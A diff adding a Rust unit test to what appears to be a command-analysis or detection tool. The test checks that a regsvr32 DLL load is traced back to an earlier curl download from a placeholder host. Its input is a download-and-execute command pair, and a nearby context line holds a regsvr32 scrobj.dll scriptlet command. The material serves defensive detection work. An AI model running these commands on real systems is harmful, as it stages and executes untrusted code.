@@ -8561,6 +8561,28 @@ regsvr32 /s /n /u /i:payload.sct scrobj.dll"#,
             report.traits
         );
     }
+
+    #[test]
+    fn regsvr32_local_load_target_resolves_prior_download_source() {
+        let report = crate::analyze(
+            br#"curl -o stage.dll https://regsvr32-load.example/stage.dll
+regsvr32 /s stage.dll"#,
+            &Config::default(),
+        );
+        let has = report.traits.iter().any(|t| {
+            matches!(
+                t,
+                Trait::UrlArgument { cmd, url }
+                    if cmd == "regsvr32 /s stage.dll"
+                        && url == "https://regsvr32-load.example/stage.dll"
+            )
+        });
+        assert!(
+            has,
+            "regsvr32 local load target did not resolve prior download source: {:?}",
+            report.traits
+        );
+    }
 }
 
 #[cfg(test)]
